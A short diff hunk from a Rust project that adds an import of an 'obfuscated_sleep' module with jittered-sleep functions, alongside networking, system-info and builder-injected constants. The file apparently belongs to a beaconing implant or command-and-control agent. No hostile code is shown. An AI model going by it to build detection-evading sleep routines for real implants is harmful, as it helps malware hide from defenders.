@@ -21,6 +21,7 @@ use log::{error, info, warn};
 use sysinfo::System;
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
+use crate::obfuscated_sleep::{calculate_jittered_sleep, execute_sleep};
 use uuid::Uuid;
 
 // Compile-time constants injected by the Builder (may be absent in manual builds).
